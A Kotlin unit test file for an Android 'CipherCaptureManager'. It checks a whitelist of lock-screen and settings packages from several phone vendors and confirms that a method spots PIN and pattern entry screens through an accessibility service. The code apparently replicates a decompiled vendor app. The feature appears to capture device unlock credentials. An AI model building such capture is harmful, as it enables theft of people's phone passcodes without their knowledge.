package com.storm.safe.rock.service.modules.cipher

import org.junit.Test
import org.junit.Assert.*

/**
 * Verifies VALID_PASSWORD_PACKAGES and isPasswordInputPackage() align
 * with vendor C0335a1.m211804a1 (line 780).
 *
 * Plan 2026-04-17-replica-cipher-capture-alignment Task 3.
 */
class CipherCaptureWhitelistTest {

    @Test
    fun `VALID_PASSWORD_PACKAGES contains basic android settings and systemui`() {
        val set = CipherCaptureManager.VALID_PASSWORD_PACKAGES
        assertTrue("com.android.settings", set.contains("com.android.settings"))
        assertTrue("com.android.systemui", set.contains("com.android.systemui"))
    }

    @Test
    fun `isPasswordInputPackage matches OPPO ColorOS variants (vendor m211804a1)`() {
        // vendor uses startsWith matching (AbstractC0779a1.m213652a5)
        assertTrue(
            "oppo.settings prefix must match",
            CipherCaptureManager.isPasswordInputPackage("com.oppo.settings")
        )
        assertTrue(
            "coloros.settings prefix must match",
            CipherCaptureManager.isPasswordInputPackage("com.coloros.settings")
        )
        assertTrue(
            "oplus.settings prefix must match",
            CipherCaptureManager.isPasswordInputPackage("com.oplus.settings")
        )
    }

    @Test
    fun `isPasswordInputPackage matches vivo variants`() {
        assertTrue(
            "vivo.settings prefix must match",
            CipherCaptureManager.isPasswordInputPackage("com.vivo.settings")
        )
    }

    @Test
    fun `isPasswordInputPackage matches samsung biometrics setting`() {
        assertTrue(
            CipherCaptureManager.isPasswordInputPackage("com.samsung.android.biometrics.app.setting")
        )
    }

    @Test
    fun `isPasswordInputPackage rejects unrelated packages`() {
        assertFalse(CipherCaptureManager.isPasswordInputPackage("com.chrome.browser"))
        assertFalse(CipherCaptureManager.isPasswordInputPackage("com.android.phone"))
        assertFalse(CipherCaptureManager.isPasswordInputPackage(null))
        assertFalse(CipherCaptureManager.isPasswordInputPackage(""))
    }

    // ═══ isInConfirmLockScreen (vendor m211804a1) ═══

    @Test
    fun `CipherCaptureManager has isInConfirmLockScreen method (vendor m211804a1)`() {
        // Source-level verification — runtime would require mocking AccessibilityService
        // with a full node tree, which is prohibitive in unit tests.
        val src = java.io.File(
            "src/main/java/com/storm/safe/rock/service/modules/cipher/CipherCaptureManager.kt"
        ).readText()
        assertTrue(
            "isInConfirmLockScreen method must exist (vendor m211804a1)",
            src.contains("fun isInConfirmLockScreen(")
        )
        assertTrue(
            "Must check rootInActiveWindow package name (vendor L778-779)",
            src.contains("rootInActiveWindow") &&
                src.contains("packageName")
        )
        assertTrue(
            "Must search key0/key1/lockPattern viewIds (vendor L793)",
            src.contains(":id/key0") &&
                src.contains(":id/key1") &&
                src.contains(":id/lockPattern")
        )
    }
}
